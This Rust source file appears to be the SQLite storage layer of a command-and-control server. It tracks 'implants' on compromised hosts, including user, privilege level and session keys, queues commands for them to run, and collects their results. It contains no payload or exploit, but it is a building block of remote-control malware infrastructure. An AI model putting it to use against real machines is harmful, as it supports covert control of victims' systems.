use anyhow::{Context, Result};
use rusqlite::{params, Connection, OptionalExtension};
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};

fn now() -> f64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs_f64()
}

#[allow(dead_code)]
pub struct Implant {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub pid: Option<i64>,
    pub elevated: bool,
    pub arch: Option<String>,
    pub first_seen: f64,
    pub last_seen: f64,
    pub session_key: Vec<u8>,
}

#[allow(dead_code)]
pub struct Task {
    pub id: i64,
    pub implant_id: String,
    pub command: String,
    pub args: String,
    pub state: String,
}

pub struct TaskResult {
    pub id: i64,
    pub task_id: i64,
    pub body: String,
    pub hostname: String,
    pub command: String,
    pub args: String,
}

pub struct TaskEntry {
    pub task_id: i64,
    pub command: String,
    pub args: String,
    pub state: String,
    pub created: f64,
    pub result: Option<String>,
}

const SCHEMA: &str = r"
CREATE TABLE IF NOT EXISTS implants (
    id TEXT PRIMARY KEY,
    hostname TEXT NOT NULL,
    username TEXT NOT NULL,
    os TEXT NOT NULL,
    pid INTEGER,
    elevated INTEGER NOT NULL DEFAULT 0,
    arch TEXT,
    first_seen REAL NOT NULL,
    last_seen REAL NOT NULL,
    session_key BLOB NOT NULL
);
CREATE TABLE IF NOT EXISTS tasks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    implant_id TEXT NOT NULL REFERENCES implants(id),
    command TEXT NOT NULL,
    args TEXT NOT NULL,
    state TEXT NOT NULL DEFAULT 'pending',
    created REAL NOT NULL,
    claimed REAL
);
CREATE TABLE IF NOT EXISTS results (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    task_id INTEGER NOT NULL REFERENCES tasks(id),
    body TEXT NOT NULL,
    created REAL NOT NULL,
    seen INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX IF NOT EXISTS tasks_pending ON tasks(implant_id, state);
";

pub struct Store {
    db: Connection,
}

impl Store {
    pub fn open(path: &Path) -> Result<Self> {
        let db = Connection::open(path).context("ouverture de la base de données")?;
        db.execute_batch("PRAGMA journal_mode=WAL; PRAGMA busy_timeout=5000; PRAGMA foreign_keys=ON;")?;
        db.execute_batch(SCHEMA)?;
        Ok(Self { db })
    }

    pub fn register(
        &self,
        id: &str,
        hostname: &str,
        username: &str,
        os: &str,
        pid: Option<i64>,
        elevated: bool,
        arch: Option<&str>,
        session_key: &[u8],
    ) -> Result<bool> {
        let known = self
            .db
            .query_row("SELECT 1 FROM implants WHERE id=?1", params![id], |_| Ok(()))
            .optional()?
            .is_some();

        self.db.execute(
            r"INSERT INTO implants
                  (id, hostname, username, os, pid, elevated, arch, first_seen, last_seen, session_key)
              VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?8,?9)
              ON CONFLICT(id) DO UPDATE SET
                  last_seen   = excluded.last_seen,
                  pid         = excluded.pid,
                  elevated    = excluded.elevated,
                  session_key = excluded.session_key",
            params![id, hostname, username, os, pid, elevated as i64, arch, now(), session_key],
        )?;
        Ok(known)
    }

    pub fn touch(&self, id: &str) -> Result<()> {
        self.db
            .execute("UPDATE implants SET last_seen=?1 WHERE id=?2", params![now(), id])?;
        Ok(())
    }

    pub fn session_key(&self, id: &str) -> Result<Option<Vec<u8>>> {
        self.db
            .query_row(
                "SELECT session_key FROM implants WHERE id=?1",
                params![id],
                |row| row.get(0),
            )
            .optional()
            .map_err(Into::into)
    }

    pub fn implant(&self, id: &str) -> Result<Option<Implant>> {
        self.db
            .query_row(
                "SELECT id, hostname, username, os, pid, elevated, arch,
                        first_seen, last_seen, session_key
                 FROM implants WHERE id=?1",
                params![id],
                row_to_implant,
            )
            .optional()
            .map_err(Into::into)
    }

    pub fn implants(&self) -> Result<Vec<Implant>> {
        let mut stmt = self.db.prepare(
            "SELECT id, hostname, username, os, pid, elevated, arch,
                    first_seen, last_seen, session_key
             FROM implants ORDER BY last_seen DESC",
        )?;
        let rows = stmt.query_map([], row_to_implant)?
            .collect::<rusqlite::Result<Vec<_>>>()?;
        Ok(rows)
    }

    pub fn enqueue(&self, implant_id: &str, command: &str, args: &str) -> Result<i64> {
        self.db.execute(
            "INSERT INTO tasks (implant_id, command, args, created) VALUES (?1,?2,?3,?4)",
            params![implant_id, command, args, now()],
        )?;
        Ok(self.db.last_insert_rowid())
    }

    pub fn claim(&self, implant_id: &str) -> Result<Option<Task>> {
        let task = self
            .db
            .query_row(
                "SELECT id, implant_id, command, args, state FROM tasks
                 WHERE implant_id=?1 AND state='pending' ORDER BY id LIMIT 1",
                params![implant_id],
                row_to_task,
            )
            .optional()?;

        if let Some(ref t) = task {
            self.db.execute(
                "UPDATE tasks SET state='running', claimed=?1 WHERE id=?2",
                params![now(), t.id],
            )?;
        }
        Ok(task)
    }

    pub fn finish(&self, task_id: i64, body: &str) -> Result<()> {
        self.db
            .execute("UPDATE tasks SET state='done' WHERE id=?1", params![task_id])?;
        self.db.execute(
            "INSERT INTO results (task_id, body, created) VALUES (?1,?2,?3)",
            params![task_id, body, now()],
        )?;
        Ok(())
    }

    pub fn pending_results(&self) -> Result<Vec<TaskResult>> {
        let mut stmt = self.db.prepare(
            "SELECT r.id, r.task_id, r.body, i.hostname, t.command, t.args
             FROM results r
             JOIN tasks t ON t.id = r.task_id
             JOIN implants i ON i.id = t.implant_id
             WHERE r.seen = 0 ORDER BY r.id",
        )?;
        let rows = stmt.query_map([], |row| {
            Ok(TaskResult {
                id: row.get(0)?,
                task_id: row.get(1)?,
                body: row.get(2)?,
                hostname: row.get(3)?,
                command: row.get(4)?,
                args: row.get(5)?,
            })
        })?
        .collect::<rusqlite::Result<Vec<_>>>()?;
        Ok(rows)
    }

    pub fn mark_seen(&self, ids: &[i64]) -> Result<()> {
        for id in ids {
            self.db
                .execute("UPDATE results SET seen=1 WHERE id=?1", params![id])?;
        }
        Ok(())
    }

    pub fn results_for(&self, implant_id: &str, limit: usize) -> Result<Vec<TaskEntry>> {
        let mut stmt = self.db.prepare(
            "SELECT t.id, t.command, t.args, t.state, t.created, r.body
             FROM tasks t
             LEFT JOIN results r ON r.task_id = t.id
             WHERE t.implant_id = ?1
             ORDER BY t.id DESC LIMIT ?2",
        )?;
        let rows = stmt.query_map(params![implant_id, limit as i64], |row| {
            Ok(TaskEntry {
                task_id: row.get(0)?,
                command: row.get(1)?,
                args: row.get(2)?,
                state: row.get(3)?,
                created: row.get(4)?,
                result: row.get(5)?,
            })
        })?
        .collect::<rusqlite::Result<Vec<_>>>()?;
        Ok(rows)
    }

    pub fn recent_tasks(&self, implant_id: &str) -> Result<Vec<Task>> {
        let mut stmt = self.db.prepare(
            "SELECT id, implant_id, command, args, state FROM tasks
             WHERE implant_id=?1 ORDER BY id DESC LIMIT 20",
        )?;
        let rows = stmt.query_map(params![implant_id], row_to_task)?
            .collect::<rusqlite::Result<Vec<_>>>()?;
        Ok(rows)
    }
}

fn row_to_implant(row: &rusqlite::Row) -> rusqlite::Result<Implant> {
    Ok(Implant {
        id: row.get(0)?,
        hostname: row.get(1)?,
        username: row.get(2)?,
        os: row.get(3)?,
        pid: row.get(4)?,
        elevated: row.get::<_, i64>(5)? != 0,
        arch: row.get(6)?,
        first_seen: row.get(7)?,
        last_seen: row.get(8)?,
        session_key: row.get(9)?,
    })
}

fn row_to_task(row: &rusqlite::Row) -> rusqlite::Result<Task> {
    Ok(Task {
        id: row.get(0)?,
        implant_id: row.get(1)?,
        command: row.get(2)?,
        args: row.get(3)?,
        state: row.get(4)?,
    })
}
